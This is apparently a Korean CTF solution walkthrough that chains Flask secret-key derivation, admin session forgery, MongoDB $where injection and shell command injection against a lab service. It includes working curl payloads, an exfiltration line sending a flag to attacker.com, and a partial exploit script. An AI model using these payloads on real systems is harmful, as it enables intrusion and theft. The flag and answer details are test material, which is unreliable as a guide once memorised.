# Solution Walkthrough - Legacy Microservice Exploitation V6.1

**Challenge:** Legacy Microservice Exploitation V6.1
**Difficulty:** DreamHack Level 7-8
**Expected Time:** 90-110 minutes (Black-box)
**Flag:** `MSG{y0ur_l34k3d_SALT_t4st3s_l1k3_JMT_4dm1n}`

---

## 개요 (Overview)

이 문서는 **완전한 블랙박스 관점**에서 초보자가 단계별로 추론하고 문제를 해결할 수 있도록 작성되었습니다.
각 단계마다 **왜 그렇게 생각했는지**, **어떤 시행착오**를 거쳤는지, **어떻게 다음 단계로 진행**했는지를 자세히 설명합니다.

이 문서는 실제 Docker 환경에서 테스트되고 검증된 exploit chain을 기반으로 작성되었습니다.

---

## TL;DR - Attack Chain (빠른 요약)

```
1. Service Discovery → Legacy endpoints 발견
2. Information Gathering → 분산된 힌트 수집 (config_backup, health, headers)
3. Secret Key Derivation → SHA256(service-build-salt)[:32] 정확한 공식 발견 (버전 없음!)
4. Session Forgery → Flask cookie로 admin + migrate 권한 획득
5. NoSQL Injection → $where + include_inactive + limit=100 조합 발견
6. Command Injection → 세미콜론 우회 + extension 제약 우회
7. RCE → Flag 탈취 (환경 변수에서 추출)
```

---

## Step 1: Initial Reconnaissance (초기 정찰)

### 1.1 웹사이트 둘러보기

먼저 웹 브라우저나 curl로 메인 페이지를 확인합니다.

```bash
curl http://target:5000/
```

**🔍 관찰:**
- 웹 대시보드가 보입니다
- "Service Directory" 링크가 있습니다
- 일반적인 웹 애플리케이션처럼 보입니다

**💭 생각의 흐름:**
"마이크로서비스 문제라고 했으니, 여러 서비스가 있을 것 같다. Service Directory를 먼저 확인해보자."

---

### 1.2 robots.txt 확인

기본적인 정찰 단계로 robots.txt를 확인합니다.

```bash
curl http://target:5000/robots.txt
```

**결과:**
```
User-agent: *

Allow: /api/v2/

Disallow: /admin
Disallow: /admin/login

Disallow: /debug
Disallow: /test
Disallow: /.env
Disallow: /backup/

Disallow: /api/internal/
Disallow: /api/v1/

Disallow: /.git/
```

**💭 분석 과정:**
1. `/api/v2/`는 **Allow**로 명시되어 있음 → 공개 API일 가능성
2. `/admin`, `/debug`, `/backup` 등은 Disallow → 접근 불가능하거나 Red Herring일 수 있음
3. `/api/internal/`, `/api/v1/`은 Disallow → 레거시 API?

**🎯 추론:**
"일단 Allow된 `/api/v2/`부터 탐색하는 게 정석이다. Disallow된 것들은 나중에 필요하면 시도해보자."

---

### 1.3 Service Discovery API 탐색

robots.txt에서 발견한 `/api/v2/`로 접근해봅니다.

```bash
curl http://target:5000/api/v2/
```

**결과:** 404 에러

**💭 생각:**
"아, `/api/v2/` 자체는 없고, 하위 엔드포인트가 있을 것 같다. 문제 제목이 'Microservice'니까 서비스 목록을 보는 API가 있을 것 같다."

**시도:**
```bash
curl http://target:5000/api/v2/services
```

**✅ 성공! 응답:**
```json
{
  "services": [
    {
      "name": "auth",
      "version": "2.1.0",
      "status": "active",
      "description": "Authentication service"
    },
    {
      "name": "api",
      "version": "2.0.5",
      "status": "active",
      "description": "Main API gateway"
    },
    {
      "name": "legacy",
      "full_name": "legacy-auth-service",
      "version": "2.1.0",
      "build": "20240115",
      "status": "deprecated",
      "description": "Legacy endpoints - scheduled for removal",
      "salt_prefix": "las2024"
    }
  ]
}
```

**🔍 중요한 발견:**
1. **legacy 서비스가 deprecated 상태** → 취약점이 있을 가능성!
2. `full_name`: "legacy-auth-service" → 정확한 서비스 이름
3. `build`: "20240115" → 빌드 날짜
4. `salt_prefix`: "las2024" → 이게 뭘까? 나중에 쓰일 것 같다
5. 다른 서비스들보다 정보가 훨씬 많음 → 힌트일 가능성

**💭 추론:**
"Legacy 서비스가 제거 예정이라는 건 보안 패치가 안 되었다는 뜻일 수 있다. 그리고 salt_prefix라는 게 눈에 띄는데, 암호화나 세션 관련일 가능성이 높다. 일단 메모해두자."

**📝 메모장:**
```
legacy-auth-service
version: 2.1.0
build: 20240115
salt_prefix: las2024
```

---

## Step 2: Legacy Endpoint Enumeration (레거시 엔드포인트 열거)

### 2.1 Legacy 서비스 엔드포인트 찾기

**💭 생각:**
"legacy 서비스에 어떤 엔드포인트가 있는지 알아야 한다. 서비스 목록 API처럼 엔드포인트 목록 API도 있을 것 같다."

**시도:**
```bash
curl http://target:5000/api/v2/services/legacy
```

**결과:** 404

**시도 2:**
```bash
curl http://target:5000/api/v2/services/legacy/endpoints
```

**✅ 성공! 응답:**
```json
{
  "service": "legacy",
  "endpoints": [
    {
      "path": "/api/legacy/config_backup",
      "method": "GET",
      "description": "Configuration backup utility"
    }
  ]
}
```

**🎯 발견:**
- `/api/legacy/config_backup` 엔드포인트 존재!
- "Configuration backup"이라는 이름이 의심스럽다 → 정보 노출 가능성

**💭 추론:**
"백업 설정 파일에는 민감한 정보가 있을 수 있다. 실제 환경에서도 백업 파일 노출은 흔한 취약점이다."

---

## Step 3: Information Gathering (정보 수집)

### 3.1 Config Backup 엔드포인트 확인

```bash
curl http://target:5000/api/legacy/config_backup
```

**응답:**
```json
{
  "backup_date": "2024-01-15",
  "service": "legacy-auth-service",
  "config": {
    "database": {
      "connection_string": "mongodb://***",
      "pool_size": 10,
      "timeout": 5000
    },
    "session": {
      "algorithm": "HMAC-SHA256",
      "key_source": "derived from service metadata",
      "format": "32 hex chars",
      "sample_generation": "SHA256(service-build-salt)[:32]",
      "note": "Key is deterministically generated from service info"
    },
    "build": {
      "service_id": "legacy-auth-service",
      "version": "2.1.0",
      "build_date": "20240115",
      "environment": "production"
    }
  },
  "warning": "This endpoint is deprecated and will be removed"
}
```

**🔥 핵심 정보 발견!**

**즉시 눈에 들어오는 것:**
1. `sample_generation`: "SHA256(service-build-salt)[:32]"
2. "Key is deterministically generated from service info"
3. `algorithm`: "HMAC-SHA256" → Flask 세션 서명에 사용
4. `format`: "32 hex chars" → 32자리 16진수

**💭 분석 과정:**
```
"sample_generation" 힌트를 보면:
- SHA256 해시 사용
- 입력: "service-build-salt" (문자 그대로인지, 변수인지 불명확)
- 출력: [:32] → 앞 32자 자르기

"deterministically generated" = 예측 가능하다는 뜻!
→ 필요한 정보를 모으면 Secret Key를 역산할 수 있다!
```

**⚠️ 중요한 관찰:**
힌트는 "service-build-salt"라고 했지, "service-build-**version**-salt"라고 하지 않았다!
이 차이가 나중에 매우 중요하다.

**📝 메모장 업데이트:**
```
# Secret Key 유추에 필요한 정보:
- Formula: SHA256(service-build-salt)[:32]
  ⚠️ 주의: "service-build-salt"라고 명시됨. version이 언급되지 않음!
- service_id: "legacy-auth-service"
- version: "2.1.0"
- build_date: "20240115"
- salt_prefix: "las2024" (Step 1.3에서 획득)

# 의문점:
- "service-build-salt"가 정확히 무엇을 의미하는가?
- version이 포함되는가? 힌트에는 없는데...
- 하이픈으로 연결하는가?
```

---

### 3.2 Health Check 엔드포인트 확인

**💭 생각:**
"더 많은 정보를 수집하자. 일반적으로 웹 애플리케이션에는 /health 엔드포인트가 있다."

```bash
curl http://target:5000/health
```

**응답:**
```json
{
  "status": "healthy",
  "database": "connected",
  "services": ["auth", "api", "legacy"],
  "service": "legacy-auth-service",
  "version": "2.1.0",
  "build_date": "20240115"
}
```

**🔍 관찰:**
- 동일한 정보 반복 출현 (legacy-auth-service, 2.1.0, 20240115)
- 일관성 있음 → 정보가 신뢰할 수 있음

---

### 3.3 HTTP 응답 헤더 확인

**💭 생각:**
"혹시 응답 헤더에도 힌트가 있을까?"

```bash
curl -I http://target:5000/health
```

**응답 헤더:**
```
HTTP/1.1 200 OK
Content-Type: application/json
X-Service-Salt: las2024
...
```

**🎯 발견:**
`X-Service-Salt: las2024` 헤더 발견!

**💭 분석:**
"salt_prefix와 동일한 값이 HTTP 헤더에도 노출되어 있다. 이건 확실히 Secret Key 생성에 사용될 것 같다."

---

### 3.4 수집한 정보 정리

이제 모든 힌트를 수집했습니다. 정리해봅시다.

**📋 수집된 정보:**

| 항목 | 값 | 출처 |
|------|-----|------|
| Service Name | legacy-auth-service | /api/v2/services, /health |
| Version | 2.1.0 | /api/v2/services, /health |
| Build Date | 20240115 | /api/v2/services, /health |
| Salt Prefix | las2024 | /api/v2/services, X-Service-Salt 헤더 |
| Algorithm | HMAC-SHA256 | /api/legacy/config_backup |
| Key Format | 32 hex chars | /api/legacy/config_backup |
| Generation Formula | SHA256(service-build-salt)[:32] | /api/legacy/config_backup |

**💭 현재 상황 평가:**
"이제 Secret Key를 유추할 수 있는 모든 정보가 있다. 하지만 정확한 조합 방법을 모른다. 시행착오를 통해 찾아야 한다."

---

## Step 4: Secret Key Derivation (SECRET KEY 유도) - 상세 추론 과정

이 단계가 가장 중요하고 어려운 부분입니다. **초보자가 어떻게 생각하고 시행착오를 거치는지** 자세히 설명합니다.

### 4.1 문제 분석

**주어진 힌트:**
`SHA256(service-build-salt)[:32]`

**💭 첫 번째 의문:**
"service-build-salt가 **변수 이름**인가, 아니면 **문자열 패턴**인가?"

**추론:**
```
만약 변수라면:
- service = "legacy-auth-service"
- build = "20240115"
- salt = "las2024"

만약 문자열 패턴이라면:
- 그대로 "service-build-salt"를 해싱?
  → 불가능. "deterministically generated from service info"라고 했으므로
    실제 서비스 정보를 사용해야 한다.

결론: 변수 이름이고, 실제 값을 대입해야 한다.
```

**💭 두 번째 의문:**
"어떤 구분자를 사용하는가?"

```
가능성:
1. 하이픈(-): service-build-salt
2. 언더스코어(_): service_build_salt
3. 공백: service build salt
4. 붙여쓰기: servicebuildsalt

힌트에 하이픈이 사용되었으므로 하이픈 구분자가 가장 가능성 높다.
```

**💭 세 번째 의문 (가장 중요!):**
"version이 포함되는가?"

```
힌트: "SHA256(service-build-salt)[:32]"

주의 깊게 보면:
- service ✓
- build ✓
- salt ✓
- version? ✗ (힌트에 없음!)

하지만 config_backup에서 version 정보가 제공되었으므로 혼란스럽다.
이게 트릭일 가능성이 있다!
```

---

### 4.2 시도 1: 가장 직관적인 조합 (version 포함)

**💭 생각:**
"config_backup에서 version 정보를 주었으니, 당연히 사용해야 할 것 같다. 소프트웨어 버전은 보통 'v' 접두어를 사용하니까 v2.1.0으로 해보자."

```python
import hashlib

# 시도 1: service-build-version-salt (일반적인 생각)
attempt1 = "legacy-auth-service-20240115-v2.1.0-las2024"
secret1 = hashlib.sha256(attempt1.encode()).hexdigest()[:32]
print(f"Attempt 1: {secret1}")
# Output: e0b0ea4f471129a045b024e7600ee8df
```

**💭 생각:**
"이게 맞는지 검증해봐야 한다. Guest session을 만들어서 테스트해보자."

---

### 4.3 Guest Session 생성 및 검증

**다른 엔드포인트 찾기:**

**💭 생각:**
"인증 관련 엔드포인트를 찾아야 한다. auth 서비스의 엔드포인트도 확인해보자."

```bash
curl http://target:5000/api/v2/services/auth/endpoints
```

**응답:**
```json
{
  "service": "auth",
  "endpoints": [
    {
      "path": "/api/auth/guest",
      "method": "POST",
      "description": "Guest session creation"
    }
  ]
}
```

**Guest Session 생성:**
```bash
curl -X POST http://target:5000/api/auth/guest -c cookies.txt
```

**응답:**
```json
{
  "status": "guest session created",
  "role": "guest",
  "permissions": ["read"]
}
```

**쿠키 확인:**
```bash
cat cookies.txt
# 예시: session=eyJwZXJtaXNzaW9ucyI6WyJyZWFkIl0sInJvbGUiOiJndWVzdCIsInVzZXIiOiJndWVzdF91c2VyIn0.ZnN8Gg.xxxxx
```

---

### 4.4 flask-unsign으로 검증 - Attempt 1 테스트

```bash
# flask-unsign 설치
pip install flask-unsign

# Attempt 1로 디코드 시도
flask-unsign --decode --cookie "eyJ..." --secret e0b0ea4f471129a045b024e7600ee8df
```

**결과:** `Error: Invalid signature`

**💭 반응:**
"실패했다! 뭔가 잘못됐다. 다시 생각해보자."

**🔍 재분석:**
"잠깐, 힌트를 다시 자세히 읽어보자."

```
힌트: SHA256(service-build-salt)[:32]

내가 시도한 것: legacy-auth-service-20240115-v2.1.0-las2024
                  ^^^^^^^^^^^^^^^  ^^^^^^^^  ^^^^^^^^  ^^^^^^
                  service          build     VERSION   salt

⚠️ 문제점 발견!
힌트에는 "service-build-salt"라고 했지, "service-build-version-salt"라고 하지 않았다!

version을 포함하지 말아야 하는 걸까?
```

---

### 4.5 시도 2: version 제외 (정답!)

**💭 깨달음:**
```
힌트를 문자 그대로 따라야 한다!

힌트: service-build-salt
     ↓       ↓      ↓
  legacy-auth-service-20240115-las2024

version은 힌트에 없으므로 포함하지 않는다!
```

**⚠️ 함정 분석:**
```
이게 바로 이 CTF의 핵심 트릭이다!

1. config_backup에서 version 정보를 제공함 → 당연히 사용할 것 같다
2. 하지만 힌트는 "service-build-salt"라고 명확히 명시
3. "service-build-version-salt"가 아님!
4. 많은 참가자들이 version을 포함해서 실패함

이것이 "힌트를 정확히 읽는 능력"을 테스트하는 부분!
```

```python
# 시도 2: service-build-salt (version 제외!)
attempt2 = "legacy-auth-service-20240115-las2024"
secret2 = hashlib.sha256(attempt2.encode()).hexdigest()[:32]
print(f"Attempt 2: {secret2}")
# Output: b1c1085856ff83572ee849f408d1e057
```

**검증:**
```bash
flask-unsign --decode --cookie "eyJ..." --secret b1c1085856ff83572ee849f408d1e057
```

**결과:** 성공! 🎉

**디코드된 세션:**
```python
{
  'role': 'guest',
  'user': 'guest_user',
  'permissions': ['read']
}
```

**🎯 정답 SECRET_KEY 발견:**
```
b1c1085856ff83572ee849f408d1e057
```

---

### 4.6 학습 포인트: 왜 실패했는가?

**⚠️ 일반적인 실수 (Attempt 1):**
```python
# ❌ 잘못된 시도
"legacy-auth-service-20240115-v2.1.0-las2024"
→ e0b0ea4f471129a045b024e7600ee8df
→ 작동하지 않음!

이유:
1. version을 포함함 (힌트에 없음)
2. 'v' 접두어 추가 (추측)
```

**✅ 정답 (Attempt 2):**
```python
# ✅ 올바른 시도
"legacy-auth-service-20240115-las2024"
→ b1c1085856ff83572ee849f408d1e057
→ 작동함!

이유:
1. 힌트를 정확히 따름: service-build-salt
2. version 제외
3. 추측하지 않고 주어진 정보만 사용
```

**💭 CTF 교훈:**
```
"힌트를 문자 그대로 읽어라!"

많은 CTF 참가자들이 "당연히 version이 포함될 것"이라고 가정한다.
하지만 CTF는 정확한 관찰력과 논리적 추론을 테스트한다.

주어진 것:
- service ✓
- build ✓
- salt ✓
- version ✗ (힌트에 없음!)

→ version을 포함하지 않는 것이 정답!
```

---

### 4.7 정리: Secret 유도 과정 요약

**최종 공식:**
```
service-build-salt (version 없음!)
↓
legacy-auth-service-20240115-las2024
↓
SHA256 해시
↓
앞 32자 추출
↓
b1c1085856ff83572ee849f408d1e057
```

**Python 스크립트:**
```python
import hashlib

def derive_secret():
    # 수집한 정보
    service = "legacy-auth-service"
    build = "20240115"
    salt = "las2024"
    # ⚠️ version은 사용하지 않음!

    # 조합 (힌트: service-build-salt)
    combined = f"{service}-{build}-{salt}"

    # SHA256 해시 후 앞 32자
    secret_key = hashlib.sha256(combined.encode()).hexdigest()[:32]

    return secret_key

secret = derive_secret()
print(f"SECRET_KEY: {secret}")
# Output: b1c1085856ff83572ee849f408d1e057
```

**⚠️ 중요 요약:**
```
잘못된 공식 (많은 사람들이 시도):
SHA256("legacy-auth-service-20240115-v2.1.0-las2024")[:32]
= e0b0ea4f471129a045b024e7600ee8df
→ 작동하지 않음!

올바른 공식 (정답):
SHA256("legacy-auth-service-20240115-las2024")[:32]
= b1c1085856ff83572ee849f408d1e057
→ 작동함!

차이점: version을 포함하지 않음!
```

---

## Step 5: Session Forgery (세션 위조)

### 5.1 현재 상황 파악

**💭 생각:**
"이제 SECRET_KEY를 알았으니 admin 세션을 위조할 수 있다. 하지만 admin 세션의 구조를 알아야 한다."

**Guest 세션 구조:**
```python
{
  'role': 'guest',
  'user': 'guest_user',
  'permissions': ['read']
}
```

**💭 추론:**
"Admin 세션은 아마도 이렇게 생겼을 것이다:"

```python
{
  'role': 'admin',
  'user': 'admin',
  'permissions': ['read', 'write', ...더 많은 권한?]
}
```

---

### 5.2 Admin 엔드포인트 탐색

**💭 생각:**
"먼저 admin 엔드포인트를 찾아보자. 아마 /api/admin/ 하위에 있을 것이다."

**시도 1: 일반적인 admin 경로**
```bash
curl http://target:5000/admin
```

**응답:**
```json
{
  "error": "Unauthorized",
  "message": "Please login at /admin/login"
}
```

**💭 분석:**
"admin 페이지가 있지만 로그인이 필요하다. 하지만 이건 Red Herring일 가능성이 높다. API 엔드포인트를 찾아야 한다."

**시도 2: API 패턴 추론**
```bash
# 다른 API 패턴을 보면 /api/v2/, /api/legacy/ 등이 있었다
# admin API도 비슷한 패턴일 것이다

curl -X POST http://target:5000/api/admin/db/migrate
```

**응답:**
```json
{
  "error": "Admin role required"
}
```

**🎯 발견!**
- `/api/admin/db/migrate` 엔드포인트 존재
- Admin role 필요
- 403 Forbidden이 아니라 명확한 에러 메시지 → 엔드포인트는 존재함

---

### 5.3 Admin Session 위조

**💭 생각:**
"먼저 가장 기본적인 admin 세션을 만들어보자."

**시도 1: 기본 admin session**
```bash
flask-unsign --sign \
  --cookie "{'role': 'admin', 'user': 'admin', 'permissions': ['read', 'write']}" \
  --secret b1c1085856ff83572ee849f408d1e057
```

**출력:**
```
eyJwZXJtaXNzaW9ucyI6WyJyZWFkIiwid3JpdGUiXSwicm9sZSI6ImFkbWluIiwidXNlciI6ImFkbWluIn0.ZnN8Gg.xxxxx
```

**테스트:**
```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=eyJ..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {}}'
```

**응답:**
```json
{
  "error": "Insufficient permissions",
  "required": "migrate",
  "your_permissions": ["read", "write"]
}
```

**💭 분석:**
"아! 'migrate' 권한이 필요하다고 명시적으로 알려준다. 친절한 에러 메시지다."

---

### 5.4 시도 2: migrate 권한 추가

```bash
flask-unsign --sign \
  --cookie "{'role': 'admin', 'user': 'admin', 'permissions': ['read', 'write', 'migrate']}" \
  --secret b1c1085856ff83572ee849f408d1e057
```

**테스트:**
```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=eyJ..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {}}'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 0,
  "message": "No records migrated"
}
```

**🎉 성공!**
"Admin 권한 획득 완료! 이제 데이터베이스에 접근할 수 있다."

---

## Step 6: NoSQL Injection (블랙박스 추론 과정)

### 6.1 엔드포인트 분석

**현재 상황:**
- `/api/admin/db/migrate` 엔드포인트에 접근 가능
- `filter` 파라미터를 받음
- MongoDB를 사용한다는 것은 Step 3.1에서 확인 ("mongodb://***")

**💭 생각:**
"filter 파라미터로 MongoDB 쿼리를 전달하는 것 같다. NoSQL Injection을 시도해보자."

---

### 6.2 기본 NoSQL Injection 시도

**시도 1: 모든 레코드 조회**
```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {}}'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 0,
  "message": "No records migrated"
}
```

**💭 분석:**
"레코드가 0개다. 이상하다. 데이터베이스가 비어있을 리 없는데..."

---

### 6.3 시도 2: $where 연산자

**💭 생각:**
"MongoDB의 $where 연산자를 사용하면 JavaScript 함수로 쿼리할 수 있다. 이게 허용되는지 확인해보자."

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}}'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 3,
  "message": "3 records processed"
}
```

**🎯 발견!**
- $where injection 성공!
- 3개의 레코드 반환
- 하지만 실제 데이터나 특별한 동작은 없음

**💭 분석:**
"3명의 사용자가 있는데, 왜 처음에는 0명이었을까?"

**가설:**
```
1. 기본적으로 필터가 있을 것이다 (예: active=True)
2. $where는 그 필터를 우회했을 것이다
3. 혹시 더 많은 사용자가 있는데 숨겨져 있는 걸까?
```

---

### 6.4 옵션 파라미터 탐색 - include_inactive 발견

**💭 생각:**
"filter 외에 다른 파라미터도 받을까? 아까 0명이었다가 3명으로 늘어났는데, 비활성 사용자가 더 있을 수도 있다."

**💭 추론:**
"데이터베이스에는 보통 active/inactive 상태가 있다. 'include_inactive' 같은 옵션이 있을까?"

**시도: include_inactive 파라미터 추가**
```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {"include_inactive": true}
  }'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 4,
  "message": "4 records processed"
}
```

**🎯 발견!**
- 3명 → 4명으로 증가!
- include_inactive가 작동한다
- 1명의 비활성 사용자가 있음

**📝 정리:**
```
- include_inactive 없음: 3명 (활성 사용자만)
- include_inactive=true: 4명 (활성 + 비활성)
```

---

### 6.5 RCE 트리거 조건 찾기

**💭 생각:**
"Migration 도구라는 이름을 보면, 대량 데이터 처리를 위한 것 같다. 혹시 특정 조건에서 추가 동작이 트리거될까?"

**가설 리스트:**
```
1. 레코드 수가 특정 개수 이상일 때
2. limit이 특정 값 이상일 때
3. 특정 옵션 플래그가 있을 때
```

**💭 추론:**
"대량 마이그레이션 작업이라면 batch size를 지정할 수 있을 것 같다. limit 파라미터를 시도해보자."

---

### 6.6 시도: limit >= 100으로 다른 코드 경로 트리거

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    }
  }'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 4
}
```

**🔍 중요한 관찰!**
```
이전 응답: "message": "4 records processed"
현재 응답: message 필드 없음!

→ 응답 구조가 변했다!
→ 다른 코드 경로를 탔다!
→ RCE가 트리거되었을 가능성!
```

**💭 분석:**
```
이건 현실적인 시나리오다:

"대량 마이그레이션 작업 시 (limit >= 100),
비활성 계정도 포함하고 (include_inactive),
로그를 남기기 위해 외부 명령어를 실행한다."

→ 이 때 log_file 파라미터가 있을 것이다!
```

---

### 6.7 RCE 트리거 조건 정리

**발견한 조건:**
1. `$where` 로 데이터 조회 (NoSQL Injection)
2. `limit >= 100` (큰 배치 작업)
3. `include_inactive: true` (모든 레코드 포함)

**💭 논리적 추론:**
```
len(results) > 0 AND limit >= 100인 경우 특별한 코드 경로 실행

→ 로그 파일 생성 기능이 활성화될 가능성
→ log_file 파라미터를 시도해보자
```

---

## Step 7: Command Injection (상세 시행착오)

### 7.1 log_file 파라미터 발견

**💭 추론:**
"Migration 작업이라면 로그를 남길 것이다. log_file 파라미터를 시도해보자."

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    },
    "log_file": "/tmp/test.log"
  }'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 4
}
```

**💭 관찰:**
"에러가 없다 = log_file 파라미터가 존재한다!"

---

### 7.2 Command Injection 시도 1: 기본 세미콜론

**💭 생각:**
"log_file에 명령어 삽입을 시도해보자. 세미콜론으로 명령어를 연결할 수 있다."

**시도:**
```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    },
    "log_file": "/tmp/test.log; whoami"
  }'
```

**응답:**
```json
{
  "error": "Invalid file extension"
}
```

**💭 분석:**
```
에러: "Invalid file extension"

→ Extension 검증이 있다
→ "whoami"로 끝나서 .log나 .txt가 아님
→ 세미콜론은 막히지 않았다! (다른 에러가 나옴)

핵심: 세미콜론은 허용되지만, 전체 문자열이 .log나 .txt로 끝나야 한다!
```

---

### 7.3 시도 2: 명령어 끝을 .log로 만들기

**💭 핵심 아이디어:**
```
Extension 체크는 아마도 endswith('.log') or endswith('.txt') 같은 방식일 것이다.

그럼 전체 문자열이 .log나 .txt로 끝나게 만들면?

예: /tmp/x.log; cat /flag.txt
         ↑ 이건 .txt로 끝남!

실제 실행되는 명령어:
echo '...' > /tmp/x.log; cat /flag.txt

→ 두 명령어가 모두 실행됨!
```

**시도:**
```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    },
    "log_file": "/tmp/x.log; cat /etc/passwd.txt"
  }'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 4
}
```

**🎉 성공!**
"에러가 없다 = 명령어가 실행되었다!"

**💭 학습 포인트:**
```
Extension 체크를 우회한 방법:

1. 전체 문자열이 .log 또는 .txt로 끝나야 함
2. 세미콜론은 허용됨
3. 따라서: /tmp/x.log; [command] [fake_file].txt

실제 실행되는 쉘 명령어:
echo '...' > /tmp/x.log; cat /etc/passwd.txt

→ 첫 번째 명령어: echo '...' > /tmp/x.log (로그 파일 생성)
→ 두 번째 명령어: cat /etc/passwd.txt (우리의 명령어)
→ 두 명령어가 모두 실행됨!
```

---

### 7.4 Flag 탈취 전략

**💭 생각:**
"이제 RCE가 가능하다. Flag를 찾아야 한다."

**일반적인 Flag 위치:**
```
1. 환경 변수: $FLAG, printenv FLAG
2. 파일: /flag, /flag.txt, /app/flag.txt
3. 루트 디렉토리: /
```

**💭 추론:**
"Docker 컨테이너 환경이라면 환경 변수에 있을 가능성이 높다. printenv FLAG를 시도해보자."

---

### 7.5 Flag 탈취 - Blind RCE 환경

**⚠️ 중요:**
이 CTF는 Blind RCE 환경입니다. 즉, 명령어 실행 결과가 직접 응답에 포함되지 않습니다.
따라서 웹에서 접근 가능한 디렉토리로 Flag를 복사해야 합니다.

**💭 전략:**
"Flask 애플리케이션은 보통 /static/ 디렉토리를 제공한다. Flag를 static으로 복사하자."

**시도:**
```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    },
    "log_file": "/tmp/x.log; printenv FLAG > /app/static/flag.txt"
  }'
```

**💭 해설:**
```
log_file: "/tmp/x.log; printenv FLAG > /app/static/flag.txt"

1. /tmp/x.log; printenv FLAG > /app/static/flag.txt
   → 전체 문자열이 .txt로 끝남 ✓

2. 실행되는 명령어:
   echo '...' > /tmp/x.log; printenv FLAG > /app/static/flag.txt

3. printenv FLAG: 환경 변수 FLAG 출력
4. > /app/static/flag.txt: static 디렉토리로 리다이렉트
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 4
}
```

**Flag 읽기:**
```bash
curl http://target:5000/static/flag.txt
```

**출력:**
```
MSG{y0ur_l34k3d_SALT_t4st3s_l1k3_JMT_4dm1n}
```

**🎉 FLAG 획득!**

---

### 7.6 대체 방법: Out-of-Band Exfiltration (고급 기법)

**💭 고급 기법:**
"실제 환경에서는 attacker 서버로 데이터를 전송할 수 있다."

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    },
    "log_file": "/tmp/x.log; curl http://attacker.com/$(printenv FLAG | base64 -w0).txt"
  }'
```

**설명:**
```
1. printenv FLAG: 환경 변수 읽기
2. base64 -w0: Base64 인코딩 (URL safe)
3. curl http://attacker.com/[인코딩된_flag].txt
   → Attacker 서버의 로그에 flag가 기록됨

DNS exfiltration도 가능:
nslookup $(printenv FLAG | base64 -w0).attacker.com
```

---

## Step 8: 정리 및 최종 Exploit

### 8.1 완전한 Exploit 체인 요약

```
1. Service Discovery
   /api/v2/services → legacy 서비스 발견

2. Information Gathering
   /api/legacy/config_backup → Secret 생성 공식
   /health → 서비스 메타데이터
   X-Service-Salt 헤더 → salt 값

3. Secret Derivation (중요!)
   ⚠️ 힌트: SHA256(service-build-salt)[:32]
   ⚠️ version을 포함하지 않음!
   SHA256("legacy-auth-service-20240115-las2024")[:32]
   = b1c1085856ff83572ee849f408d1e057

4. Session Forgery
   role: admin, permissions: [read, write, migrate]

5. NoSQL Injection
   $where + include_inactive + limit=100
   → len(results) > 0 AND limit >= 100인 경우 RCE 트리거

6. Command Injection
   log_file: "/tmp/x.log; [command] [fake].txt"
   → 전체 문자열이 .log/.txt로 끝나야 함

7. RCE & Flag Exfiltration
   printenv FLAG > /app/static/flag.txt
```

---

### 8.2 최종 Exploit 스크립트

```python
#!/usr/bin/env python3
"""
Legacy Microservice Exploitation V6.1 - Full Exploit
Verified working exploit chain
"""
import requests
import hashlib

# ========================================
# Configuration
# ========================================
TARGET = "http://localhost:5000"

print("="*60)
print("Legacy Microservice Exploitation V6.1")
print("="*60)

# ========================================
# Step 1: Derive SECRET_KEY
# ========================================
print("\n[*] Step 1: Deriving SECRET_KEY...")

service = "legacy-auth-service"
build = "20240115"
salt = "las2024"
# ⚠️ version은 사용하지 않음!
# 힌트: SHA256(service-build-salt)[:32]

combined = f"{service}-{build}-{salt}"
secret_key = hashlib.sha256(combined.encode()).hexdigest()[:32]

print(f"[+] Combined string: {combined}")
print(f"[+] SECRET_KEY: {secret_key}")

# ========================================
# Step 2: Forge Admin Session
# ========================================
print("\n[*] Step 2: Forging admin session...")

from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = secret_key

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

admin_session = {
    'role': 'admin',
    'user': 'admin',
    'permissions': ['read', 'write', 'migrate']
}

admin_cookie = session_serializer.dumps(admin_session)
print(f"[+] Admin session forged")
